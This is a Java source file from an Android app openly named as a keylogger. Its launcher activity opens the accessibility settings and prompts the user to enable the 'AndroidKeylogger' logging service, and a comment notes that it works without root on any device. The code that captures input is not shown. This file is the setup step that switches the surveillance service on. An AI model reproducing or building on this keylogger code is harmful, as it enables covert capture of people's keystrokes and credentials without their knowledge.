package com.bshu2.androidkeylogger;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;
import android.widget.Toast;

/**
 * Launcher activity. Opens the accessibility settings screen so the user can
 * enable the logging service. Works on any device, no root required.
 */
public class MainActivity extends Activity {

    private static final String TAG = "MainActivity";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Log.d(TAG, "onCreate");

        try {
            startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
            Toast.makeText(this, "Enable AndroidKeylogger under Accessibility",
                    Toast.LENGTH_LONG).show();
        } catch (Exception e) {
            Log.e(TAG, "could not open accessibility settings", e);
        }
    }
}
